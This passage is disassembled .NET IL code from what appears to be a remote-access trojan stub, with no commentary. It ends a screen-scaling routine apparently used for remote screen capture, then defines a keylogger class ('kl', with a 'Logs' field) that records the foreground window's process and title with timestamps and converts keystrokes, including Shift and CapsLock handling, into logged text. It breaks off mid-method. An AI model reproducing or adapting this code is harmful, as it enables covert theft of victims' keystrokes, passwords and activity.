    IL_0015:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_001a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001f:  stloc.3
    IL_0020:  ldloca.s   V_3
    IL_0022:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0027:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_002c:  nop
    IL_002d:  nop
    IL_002e:  ldarg.0
    IL_002f:  stloc.s    V_7
    IL_0031:  ldloc.s    V_7
    IL_0033:  switch     ( 
                          IL_0075,
                          IL_0082,
                          IL_00da,
                          IL_0132,
                          IL_018a,
                          IL_01e2,
                          IL_023a,
                          IL_0292,
                          IL_02ea,
                          IL_0342,
                          IL_039a,
                          IL_03f2,
                          IL_044a,
                          IL_049c)
    IL_0070:  br         IL_04ec

    IL_0075:  nop
    IL_0076:  ldloc.1
    IL_0077:  stloc.0
    IL_0078:  br         IL_057b

    IL_007d:  br         IL_04ec

    IL_0082:  nop
    IL_0083:  ldloca.s   V_1
    IL_0085:  ldloca.s   V_1
    IL_0087:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_008c:  conv.r8
    IL_008d:  ldc.r8     1.1000000000000001
    IL_0096:  div
    IL_0097:  conv.r8
    IL_0098:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_009d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00a2:  conv.ovf.i4
    IL_00a3:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_00a8:  nop
    IL_00a9:  ldloca.s   V_1
    IL_00ab:  ldloca.s   V_1
    IL_00ad:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_00b2:  conv.r8
    IL_00b3:  ldc.r8     1.1000000000000001
    IL_00bc:  div
    IL_00bd:  conv.r8
    IL_00be:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00c3:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00c8:  conv.ovf.i4
    IL_00c9:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_00ce:  nop
    IL_00cf:  nop
    IL_00d0:  br         IL_04ec

    IL_00d5:  br         IL_04ec

    IL_00da:  nop
    IL_00db:  ldloca.s   V_1
    IL_00dd:  ldloca.s   V_1
    IL_00df:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00e4:  conv.r8
    IL_00e5:  ldc.r8     1.3
    IL_00ee:  div
    IL_00ef:  conv.r8
    IL_00f0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00f5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00fa:  conv.ovf.i4
    IL_00fb:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0100:  nop
    IL_0101:  ldloca.s   V_1
    IL_0103:  ldloca.s   V_1
    IL_0105:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_010a:  conv.r8
    IL_010b:  ldc.r8     1.3
    IL_0114:  div
    IL_0115:  conv.r8
    IL_0116:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_011b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0120:  conv.ovf.i4
    IL_0121:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0126:  nop
    IL_0127:  nop
    IL_0128:  br         IL_04ec

    IL_012d:  br         IL_04ec

    IL_0132:  nop
    IL_0133:  ldloca.s   V_1
    IL_0135:  ldloca.s   V_1
    IL_0137:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_013c:  conv.r8
    IL_013d:  ldc.r8     1.5
    IL_0146:  div
    IL_0147:  conv.r8
    IL_0148:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_014d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0152:  conv.ovf.i4
    IL_0153:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0158:  nop
    IL_0159:  ldloca.s   V_1
    IL_015b:  ldloca.s   V_1
    IL_015d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0162:  conv.r8
    IL_0163:  ldc.r8     1.5
    IL_016c:  div
    IL_016d:  conv.r8
    IL_016e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0173:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0178:  conv.ovf.i4
    IL_0179:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_017e:  nop
    IL_017f:  nop
    IL_0180:  br         IL_04ec

    IL_0185:  br         IL_04ec

    IL_018a:  nop
    IL_018b:  ldloca.s   V_1
    IL_018d:  ldloca.s   V_1
    IL_018f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0194:  conv.r8
    IL_0195:  ldc.r8     1.8999999999999999
    IL_019e:  div
    IL_019f:  conv.r8
    IL_01a0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01a5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01aa:  conv.ovf.i4
    IL_01ab:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_01b0:  nop
    IL_01b1:  ldloca.s   V_1
    IL_01b3:  ldloca.s   V_1
    IL_01b5:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01ba:  conv.r8
    IL_01bb:  ldc.r8     1.8999999999999999
    IL_01c4:  div
    IL_01c5:  conv.r8
    IL_01c6:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01cb:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01d0:  conv.ovf.i4
    IL_01d1:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_01d6:  nop
    IL_01d7:  nop
    IL_01d8:  br         IL_04ec

    IL_01dd:  br         IL_04ec

    IL_01e2:  nop
    IL_01e3:  ldloca.s   V_1
    IL_01e5:  ldloca.s   V_1
    IL_01e7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01ec:  conv.r8
    IL_01ed:  ldc.r8     2.
    IL_01f6:  div
    IL_01f7:  conv.r8
    IL_01f8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01fd:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0202:  conv.ovf.i4
    IL_0203:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0208:  nop
    IL_0209:  ldloca.s   V_1
    IL_020b:  ldloca.s   V_1
    IL_020d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0212:  conv.r8
    IL_0213:  ldc.r8     2.
    IL_021c:  div
    IL_021d:  conv.r8
    IL_021e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0223:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0228:  conv.ovf.i4
    IL_0229:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_022e:  nop
    IL_022f:  nop
    IL_0230:  br         IL_04ec

    IL_0235:  br         IL_04ec

    IL_023a:  nop
    IL_023b:  ldloca.s   V_1
    IL_023d:  ldloca.s   V_1
    IL_023f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0244:  conv.r8
    IL_0245:  ldc.r8     2.1000000000000001
    IL_024e:  div
    IL_024f:  conv.r8
    IL_0250:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0255:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_025a:  conv.ovf.i4
    IL_025b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0260:  nop
    IL_0261:  ldloca.s   V_1
    IL_0263:  ldloca.s   V_1
    IL_0265:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_026a:  conv.r8
    IL_026b:  ldc.r8     2.1000000000000001
    IL_0274:  div
    IL_0275:  conv.r8
    IL_0276:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_027b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0280:  conv.ovf.i4
    IL_0281:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0286:  nop
    IL_0287:  nop
    IL_0288:  br         IL_04ec

    IL_028d:  br         IL_04ec

    IL_0292:  nop
    IL_0293:  ldloca.s   V_1
    IL_0295:  ldloca.s   V_1
    IL_0297:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_029c:  conv.r8
    IL_029d:  ldc.r8     2.2000000000000002
    IL_02a6:  div
    IL_02a7:  conv.r8
    IL_02a8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02ad:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02b2:  conv.ovf.i4
    IL_02b3:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_02b8:  nop
    IL_02b9:  ldloca.s   V_1
    IL_02bb:  ldloca.s   V_1
    IL_02bd:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_02c2:  conv.r8
    IL_02c3:  ldc.r8     2.2000000000000002
    IL_02cc:  div
    IL_02cd:  conv.r8
    IL_02ce:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02d3:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02d8:  conv.ovf.i4
    IL_02d9:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_02de:  nop
    IL_02df:  nop
    IL_02e0:  br         IL_04ec

    IL_02e5:  br         IL_04ec

    IL_02ea:  nop
    IL_02eb:  ldloca.s   V_1
    IL_02ed:  ldloca.s   V_1
    IL_02ef:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_02f4:  conv.r8
    IL_02f5:  ldc.r8     2.5
    IL_02fe:  div
    IL_02ff:  conv.r8
    IL_0300:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0305:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_030a:  conv.ovf.i4
    IL_030b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0310:  nop
    IL_0311:  ldloca.s   V_1
    IL_0313:  ldloca.s   V_1
    IL_0315:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_031a:  conv.r8
    IL_031b:  ldc.r8     2.5
    IL_0324:  div
    IL_0325:  conv.r8
    IL_0326:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_032b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0330:  conv.ovf.i4
    IL_0331:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0336:  nop
    IL_0337:  nop
    IL_0338:  br         IL_04ec

    IL_033d:  br         IL_04ec

    IL_0342:  nop
    IL_0343:  ldloca.s   V_1
    IL_0345:  ldloca.s   V_1
    IL_0347:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_034c:  conv.r8
    IL_034d:  ldc.r8     3.
    IL_0356:  div
    IL_0357:  conv.r8
    IL_0358:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_035d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0362:  conv.ovf.i4
    IL_0363:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0368:  nop
    IL_0369:  ldloca.s   V_1
    IL_036b:  ldloca.s   V_1
    IL_036d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0372:  conv.r8
    IL_0373:  ldc.r8     3.
    IL_037c:  div
    IL_037d:  conv.r8
    IL_037e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0383:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0388:  conv.ovf.i4
    IL_0389:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_038e:  nop
    IL_038f:  nop
    IL_0390:  br         IL_04ec

    IL_0395:  br         IL_04ec

    IL_039a:  nop
    IL_039b:  ldloca.s   V_1
    IL_039d:  ldloca.s   V_1
    IL_039f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_03a4:  conv.r8
    IL_03a5:  ldc.r8     3.5
    IL_03ae:  div
    IL_03af:  conv.r8
    IL_03b0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03b5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03ba:  conv.ovf.i4
    IL_03bb:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_03c0:  nop
    IL_03c1:  ldloca.s   V_1
    IL_03c3:  ldloca.s   V_1
    IL_03c5:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_03ca:  conv.r8
    IL_03cb:  ldc.r8     3.5
    IL_03d4:  div
    IL_03d5:  conv.r8
    IL_03d6:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03db:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_03e0:  conv.ovf.i4
    IL_03e1:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_03e6:  nop
    IL_03e7:  nop
    IL_03e8:  br         IL_04ec

    IL_03ed:  br         IL_04ec

    IL_03f2:  nop
    IL_03f3:  ldloca.s   V_1
    IL_03f5:  ldloca.s   V_1
    IL_03f7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_03fc:  conv.r8
    IL_03fd:  ldc.r8     4.
    IL_0406:  div
    IL_0407:  conv.r8
    IL_0408:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_040d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0412:  conv.ovf.i4
    IL_0413:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0418:  nop
    IL_0419:  ldloca.s   V_1
    IL_041b:  ldloca.s   V_1
    IL_041d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0422:  conv.r8
    IL_0423:  ldc.r8     4.
    IL_042c:  div
    IL_042d:  conv.r8
    IL_042e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0433:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0438:  conv.ovf.i4
    IL_0439:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_043e:  nop
    IL_043f:  nop
    IL_0440:  br         IL_04ec

    IL_0445:  br         IL_04ec

    IL_044a:  nop
    IL_044b:  ldloca.s   V_1
    IL_044d:  ldloca.s   V_1
    IL_044f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0454:  conv.r8
    IL_0455:  ldc.r8     5.
    IL_045e:  div
    IL_045f:  conv.r8
    IL_0460:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0465:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_046a:  conv.ovf.i4
    IL_046b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0470:  nop
    IL_0471:  ldloca.s   V_1
    IL_0473:  ldloca.s   V_1
    IL_0475:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_047a:  conv.r8
    IL_047b:  ldc.r8     5.
    IL_0484:  div
    IL_0485:  conv.r8
    IL_0486:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_048b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0490:  conv.ovf.i4
    IL_0491:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0496:  nop
    IL_0497:  nop
    IL_0498:  br.s       IL_04ec

    IL_049a:  br.s       IL_04ec

    IL_049c:  nop
    IL_049d:  ldloca.s   V_1
    IL_049f:  ldloca.s   V_1
    IL_04a1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_04a6:  conv.r8
    IL_04a7:  ldc.r8     6.
    IL_04b0:  div
    IL_04b1:  conv.r8
    IL_04b2:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04b7:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04bc:  conv.ovf.i4
    IL_04bd:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_04c2:  nop
    IL_04c3:  ldloca.s   V_1
    IL_04c5:  ldloca.s   V_1
    IL_04c7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_04cc:  conv.r8
    IL_04cd:  ldc.r8     6.
    IL_04d6:  div
    IL_04d7:  conv.r8
    IL_04d8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04dd:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_04e2:  conv.ovf.i4
    IL_04e3:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_04e8:  nop
    IL_04e9:  nop
    IL_04ea:  br.s       IL_04ec

    IL_04ec:  nop
    IL_04ed:  ldloca.s   V_1
    IL_04ef:  ldloca.s   V_1
    IL_04f1:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_04f6:  stloc.s    V_5
    IL_04f8:  ldloca.s   V_5
    IL_04fa:  call       instance string [mscorlib]System.Int32::ToString()
    IL_04ff:  ldc.i4.1
    IL_0500:  ldloca.s   V_1
    IL_0502:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0507:  stloc.s    V_6
    IL_0509:  ldloca.s   V_6
    IL_050b:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0510:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0515:  ldc.i4.1
    IL_0516:  sub.ovf
    IL_0517:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_051c:  ldc.i4.0
    IL_051d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0522:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0527:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_052c:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0531:  nop
    IL_0532:  ldloca.s   V_1
    IL_0534:  ldloca.s   V_1
    IL_0536:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_053b:  stloc.s    V_6
    IL_053d:  ldloca.s   V_6
    IL_053f:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0544:  ldc.i4.1
    IL_0545:  ldloca.s   V_1
    IL_0547:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_054c:  stloc.s    V_5
    IL_054e:  ldloca.s   V_5
    IL_0550:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0555:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_055a:  ldc.i4.1
    IL_055b:  sub.ovf
    IL_055c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Mid(string,
                                                                                          int32,
                                                                                          int32)
    IL_0561:  ldc.i4.0
    IL_0562:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0567:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_056c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_0571:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0576:  nop
    IL_0577:  ldloc.1
    IL_0578:  stloc.0
    IL_0579:  br.s       IL_057b

    IL_057b:  ldloc.0
    IL_057c:  ret
  } // end of method CRDP1::QZ

} // end of class Stub.CRDP1

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       38 (0x26)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000e:  ldarg.0
    IL_000f:  ldstr      ""
    IL_0014:  stfld      string j.kl::Logs
    IL_0019:  ldarg.0
    IL_001a:  ldstr      "[kl]"
    IL_001f:  stfld      string j.kl::vn
    IL_0024:  nop
    IL_0025:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       252 (0xfc)
    .maxstack  4
    .locals init (string V_0,
             native int V_1,
             int32 V_2,
             class [System]System.Diagnostics.Process V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             valuetype [mscorlib]System.DateTime V_6,
             string[] V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int j.OK::GetForegroundWindow_()
      IL_0007:  stloc.1
      IL_0008:  ldloc.1
      IL_0009:  ldloca.s   V_2
      IL_000b:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0010:  pop
      IL_0011:  ldloc.2
      IL_0012:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0017:  stloc.3
      IL_0018:  ldloca.s   V_1
      IL_001a:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001f:  ldarg.0
      IL_0020:  ldfld      int32 j.kl::LastAV
      IL_0025:  ceq
      IL_0027:  ldarg.0
      IL_0028:  ldfld      string j.kl::LastAS
      IL_002d:  ldloc.3
      IL_002e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0033:  ldc.i4.0
      IL_0034:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0039:  ldc.i4.0
      IL_003a:  ceq
      IL_003c:  and
      IL_003d:  ldloc.3
      IL_003e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0043:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0048:  ldc.i4.0
      IL_0049:  ceq
      IL_004b:  or
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  stloc.s    V_8
      IL_0051:  ldloc.s    V_8
      IL_0053:  brfalse.s  IL_00cc

      IL_0055:  ldarg.0
      IL_0056:  ldloca.s   V_1
      IL_0058:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_005d:  stfld      int32 j.kl::LastAV
      IL_0062:  ldarg.0
      IL_0063:  ldloc.3
      IL_0064:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0069:  stfld      string j.kl::LastAS
      IL_006e:  ldc.i4.6
      IL_006f:  newarr     [mscorlib]System.String
      IL_0074:  stloc.s    V_7
      IL_0076:  ldloc.s    V_7
      IL_0078:  ldc.i4.0
      IL_0079:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_007e:  stelem.ref
      IL_007f:  nop
      IL_0080:  ldloc.s    V_7
      IL_0082:  ldc.i4.1
      IL_0083:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_0088:  stloc.s    V_6
      IL_008a:  ldloca.s   V_6
      IL_008c:  ldstr      "yy/MM/dd "
      IL_0091:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0096:  stelem.ref
      IL_0097:  nop
      IL_0098:  ldloc.s    V_7
      IL_009a:  ldc.i4.2
      IL_009b:  ldloc.3
      IL_009c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_00a1:  stelem.ref
      IL_00a2:  nop
      IL_00a3:  ldloc.s    V_7
      IL_00a5:  ldc.i4.3
      IL_00a6:  ldstr      " "
      IL_00ab:  stelem.ref
      IL_00ac:  nop
      IL_00ad:  ldloc.s    V_7
      IL_00af:  ldc.i4.4
      IL_00b0:  ldarg.0
      IL_00b1:  ldfld      string j.kl::LastAS
      IL_00b6:  stelem.ref
      IL_00b7:  nop
      IL_00b8:  ldloc.s    V_7
      IL_00ba:  ldc.i4.5
      IL_00bb:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00c0:  stelem.ref
      IL_00c1:  nop
      IL_00c2:  ldloc.s    V_7
      IL_00c4:  call       string [mscorlib]System.String::Concat(string[])
      IL_00c9:  stloc.0
      IL_00ca:  leave.s    IL_00fa

      IL_00cc:  nop
      IL_00cd:  leave.s    IL_00f1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cf:  dup
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d5:  stloc.s    V_5
      IL_00d7:  nop
      IL_00d8:  ldloc.s    V_5
      IL_00da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00df:  nop
      IL_00e0:  ldloc.s    V_5
      IL_00e2:  stloc.s    V_4
      IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e9:  nop
      IL_00ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ef:  leave.s    IL_00f1

    }  // end handler
    IL_00f1:  nop
    IL_00f2:  ldstr      ""
    IL_00f7:  stloc.0
    IL_00f8:  br.s       IL_00fa

    IL_00fa:  ldloc.0
    IL_00fb:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       597 (0x255)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_5,
             char V_6,
             bool V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_0010:  stloc.1
    IL_0011:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0016:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001b:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_0020:  stloc.s    V_7
    IL_0022:  ldloc.s    V_7
    IL_0024:  brfalse.s  IL_0035

    IL_0026:  ldloc.1
    IL_0027:  stloc.s    V_8
    IL_0029:  ldloc.s    V_8
    IL_002b:  brfalse.s  IL_0031

    IL_002d:  ldc.i4.0
    IL_002e:  stloc.1
    IL_002f:  br.s       IL_0034

    IL_0031:  nop
    IL_0032:  ldc.i4.1
    IL_0033:  stloc.1
    IL_0034:  nop
    IL_0035:  nop
    IL_0036:  nop
    .try
    {
      IL_0037:  nop
      IL_0038:  ldarg.1
      IL_0039:  stloc.s    V_5
      IL_003b:  nop
      IL_003c:  ldloc.s    V_5
      IL_003e:  ldc.i4.s   46
      IL_0040:  beq.s      IL_004a

      IL_0042:  ldloc.s    V_5
      IL_0044:  ldc.i4.8
      IL_0045:  beq.s      IL_004a

      IL_0047:  ldc.i4.0
      IL_0048:  br.s       IL_004b

      IL_004a:  ldc.i4.1
      IL_004b:  nop
      IL_004c:  stloc.s    V_8
      IL_004e:  ldloc.s    V_8
      IL_0050:  brfalse.s  IL_0077

      IL_0052:  ldstr      "["
      IL_0057:  ldarg.1
      IL_0058:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_005d:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_0062:  ldstr      "]"
      IL_0067:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006c:  stloc.0
      IL_006d:  leave      IL_0253

      IL_0072:  br         IL_01ca

      IL_0077:  nop
      IL_0078:  ldloc.s    V_5
      IL_007a:  ldc.i4     0xa0
      IL_007f:  beq.s      IL_008a

      IL_0081:  ldloc.s    V_5
      IL_0083:  ldc.i4     0xa1
      IL_0088:  bne.un.s   IL_008c

      IL_008a:  br.s       IL_0095

      IL_008c:  ldloc.s    V_5
      IL_008e:  ldc.i4     0x10000
      IL_0093:  bne.un.s   IL_0097

      IL_0095:  br.s       IL_009d

      IL_0097:  ldloc.s    V_5
      IL_0099:  ldc.i4.s   16
      IL_009b:  bne.un.s   IL_009f

      IL_009d:  br.s       IL_00a8

      IL_009f:  ldloc.s    V_5
      IL_00a1:  ldc.i4     0x20000
      IL_00a6:  bne.un.s   IL_00aa

      IL_00a8:  br.s       IL_00b0

      IL_00aa:  ldloc.s    V_5
      IL_00ac:  ldc.i4.s   17
      IL_00ae:  bne.un.s   IL_00b2

      IL_00b0:  br.s       IL_00bb

      IL_00b2:  ldloc.s    V_5
      IL_00b4:  ldc.i4     0xa3
      IL_00b9:  bne.un.s   IL_00bd

      IL_00bb:  br.s       IL_00c6

      IL_00bd:  ldloc.s    V_5
      IL_00bf:  ldc.i4     0xa2
      IL_00c4:  bne.un.s   IL_00c8

      IL_00c6:  br.s       IL_00d1

      IL_00c8:  ldloc.s    V_5
      IL_00ca:  ldc.i4     0x40000
